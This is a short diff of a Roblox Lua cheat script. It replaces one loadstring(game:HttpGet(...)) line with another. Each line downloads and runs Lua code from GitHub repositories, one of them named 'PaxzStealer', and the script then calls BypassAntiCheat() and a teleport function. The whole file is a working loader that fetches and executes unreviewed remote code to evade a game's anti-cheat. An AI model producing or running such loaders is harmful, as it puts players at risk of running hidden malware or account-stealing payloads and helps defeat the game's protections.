@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psxscripter1337/dfvswvds/main/uwuwu.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/API"))()
 BypassAntiCheat()
 AreaTeleport("Shop")
